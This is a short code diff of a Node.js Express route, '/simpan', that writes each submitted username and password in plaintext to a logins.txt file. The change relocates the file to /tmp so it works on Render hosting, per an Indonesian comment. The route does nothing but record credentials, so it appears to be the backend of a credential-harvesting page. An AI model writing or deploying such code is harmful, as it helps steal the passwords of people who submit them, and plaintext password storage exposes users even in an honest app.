@@ -14,7 +14,7 @@ app.post('/simpan', (req, res) => {
   const { username, password } = req.body;
   const logData = `Username: ${username}, Password: ${password}\n`;
 
-  const logPath = path.join(__dirname, 'data', 'logins.txt');
+  const logPath = path.join('/tmp', 'logins.txt'); // Ubah ke /tmp agar bisa disimpan di server Render
 
   fs.appendFile(logPath, logData, (err) => {
     if (err) {
